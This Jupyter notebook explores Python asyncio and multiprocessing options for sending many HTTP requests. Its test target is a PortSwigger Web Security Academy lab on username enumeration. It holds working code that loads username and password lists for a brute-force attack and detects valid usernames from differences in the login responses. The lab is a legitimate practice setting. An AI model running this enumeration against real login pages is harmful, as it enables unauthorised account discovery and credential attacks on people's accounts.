{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d887ae62",
   "metadata": {},
   "source": [
    "This notebook aims to explore the different multiprocessing options and how they work with requests."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "af2f48ba",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from multiprocessing.pool import Pool\n",
    "import tqdm.notebook as tq\n",
    "import asyncio"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "047cc2d7",
   "metadata": {},
   "source": [
    "Do this for async execution within jupyter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "b18c51c7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import nest_asyncio\n",
    "nest_asyncio.apply()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "83a34912",
   "metadata": {},
   "source": [
    "We'll use this lab[1] for now as our testing environment.\n",
    "\n",
    "[1]https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "44c533d7",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://ac771f3b1f654e64c03a6e24004400a1.web-security-academy.net/login\"\n",
    "\n",
    "text_dir = \"../../../library/text_files/\"\n",
    "\n",
    "#Get usernames and passwords lists for brute force attack\n",
    "with open(text_dir + \"uname_list.txt\", 'r') as f:\n",
    "    usernames = [x.strip() for x in f.readlines()]\n",
    "\n",
    "with open(text_dir + \"pw_list.txt\", 'r') as f:\n",
    "    passwords = [x.strip() for x in f.readlines()]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1210d7b9",
   "metadata": {},
   "source": [
    "### Normal Function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "eae7d2c7",
   "metadata": {},
   "outputs": [],
   "source": [
    "def guess_username(username, URL):\n",
    "    \n",
    "    r = requests.post(URL, data={\"username\" : username, \"password\" : \"test\"})\n",
    "    \n",
    "    if \"Invalid username\" in r.text:\n",
    "        return [username, 0]\n",
    "    else:\n",
    "        return [username, 1]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77e87e01",
   "metadata": {},
   "source": [
    "### Async Function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ac4b4c7c",
   "metadata": {},
   "outputs": [],
   "source": [
    "async def guess_username_async(username, URL):\n",
    "    \n",
    "    import requests\n",
    "    \n",
    "    r = requests.post(URL, data={\"username\" : username, \"password\" : \"test\"})\n",
    "    \n",
    "    if \"Invalid username\" in r.text:\n",
    "        return [username, 0]\n",
    "    else:\n",
    "        return [username, 1]\n",
    "    \n",
    "async def guess_username_batch(username_list):\n",
    "    tasks = []\n",
    "    \n",
    "    for each_username in username_list:\n",
    "        tasks.append(asyncio.create_task(guess_username_async(each_username, URL)))\n",
    "    \n",
    "    return await asyncio.gather(*tasks)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "0e73897f",
   "metadata": {},
   "outputs": [],
   "source": [
    "#For Basic Test\n",
    "\n",
    "no_unames_test = 10\n",
    "usernames_test = usernames[:no_unames_test]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a44b190",
   "metadata": {},
   "source": [
    "# Serial Async"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b9e8745f",
   "metadata": {},
   "source": [
    "## Basic Test"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "97b05229",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%timeit -n 1\n",
    "\n",
    "loop = asyncio.get_event_loop()\n",
    "res = loop.run_until_complete(guess_username_batch(usernames_test))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b6a8710a",
   "metadata": {},
   "source": [
    "# Apply"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d283e616",
   "metadata": {},
   "source": [
    "## Basic Test"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "20ec82bc",
   "metadata": {},
   "source": [
    "Here we try apply and apply_async with both a small and large (> cpu cores) number of threads."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7708fd7",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%timeit -n 1\n",
    "with Pool(processes=4) as pool:\n",
    "    res = list(pool.apply(guess_username, args=[x, URL]) for x in usernames_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79f9f96a",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%timeit -n 1\n",
    "with Pool(processes=4) as pool:\n",
    "    res = list(pool.apply_async(guess_username, args=[x, URL]) for x in usernames_test)\n",
    "    res = [x.get() for x in res]    #We must wait for the results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bfcc7480",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%timeit -n 1\n",
    "with Pool(processes=16) as pool:\n",
    "    res = list(pool.apply_async(guess_username, args=[x, URL]) for x in usernames_test)\n",
    "    res = [x.get() for x in res]    #We must wait for the results"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9cddfde5",
   "metadata": {},
   "source": [
    "## Full Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dedbc19e",
   "metadata": {},
   "source": [
    "# Scrapbook"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b17a21f3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
